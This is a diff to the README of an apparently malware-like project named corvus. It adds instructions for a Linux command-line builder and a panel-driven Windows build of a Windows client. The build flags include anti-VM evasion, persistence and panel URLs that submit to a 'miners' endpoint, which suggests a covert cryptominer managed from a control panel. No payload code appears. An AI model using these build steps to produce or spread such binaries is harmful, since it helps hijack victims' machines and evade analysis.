@@ -18,6 +18,50 @@ Run the PowerShell script directly for same behavior:
 .\build.ps1
 ```
 
+### Linux (CLI, no UI)
+The Linux builder cross-compiles the same Windows client with MinGW-w64 and takes
+all settings as flags, so the panel (or any script) can drive it non-interactively.
+Install the toolchain once, build the builder, then run it:
+
+```bash
+sudo apt install cmake mingw-w64
+
+cd BuilderCLI
+go build -trimpath -ldflags="-s -w" -o ../builder .
+cd ..
+
+./builder -panel-urls https://panel.example.com/api/miners/submit \
+          -antivm -persistence -output dist
+```
+
+The binary is written to `dist/corvus.exe`. See
+[BuilderCLI/README.md](BuilderCLI/README.md) for every flag, the JSON config
+format and the exit codes.
+
+The panel drives the same builder from its **Builder** page (`/builder`): set the
+URLs and feature toggles there and the compiled binary appears under
+`Panel/static/builds/` for download. See [Panel/README.md](Panel/README.md).
+
+### Windows (panel-driven builds)
+When the panel itself runs on Windows it uses `Builder/build.ps1` instead of the
+Linux CLI builder. No GUI or elevation is involved: the panel writes a build spec
+to a temp file and runs
+
+```powershell
+powershell -NoProfile -ExecutionPolicy Bypass -File Builder/build.ps1 -panel_config <spec.json> -json
+```
+
+`build.ps1` then stages `Client/` to `%TEMP%` (the repository is never modified),
+builds with MinGW and prints one JSON result document on stdout.
+
+Requirements on the Windows host:
+- PowerShell 5.0+ (built in)
+- CMake and MinGW-w64 on `PATH` (`cmake`, `gcc`, `g++`, `windres`, `mingw32-make`) —
+  e.g. `choco install cmake mingw -y`. The panel never installs anything or asks for admin.
+- The `Builder/` folder next to `Panel/` (override with `CORVUS_BUILD_SCRIPT`)
+
+`CORVUS_BUILDER` forces the CLI backend even on Windows.
+
 ## Build Configuration
 
 ### Config Method
@@ -48,7 +92,7 @@ The build script automatically installs (one-time, if missing):
 
 ## Requirements
 
-- Windows 10 or later
+- Windows 10 or later (Windows builder), or a Linux host with `cmake` + `mingw-w64` (CLI builder)
 - Internet connection (for first-time setup only)
 - ~500MB free disk space
 - Admin rights recommended (for Chocolatey installation)
@@ -59,6 +103,8 @@ After building, the binary will be at:
 ```
 Client/build/corvus.exe
 ```
+
+With the Linux CLI builder the artifact lands at `dist/corvus.exe` (configurable with `-output` and `-name`).
 
 ## Troubleshooting
 
